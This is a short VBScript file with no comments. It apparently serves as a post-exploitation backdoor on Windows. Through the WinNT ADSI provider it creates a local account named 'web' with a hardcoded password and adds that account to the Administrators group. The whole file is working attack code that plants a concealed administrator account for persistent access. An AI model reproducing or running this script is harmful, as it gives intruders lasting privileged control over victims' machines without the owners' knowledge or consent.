set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","web")
od.SetPassword "web609150260"
od.SetInfo
Set of=GetObject(os&"/web",user)
oe.add os&"/web"
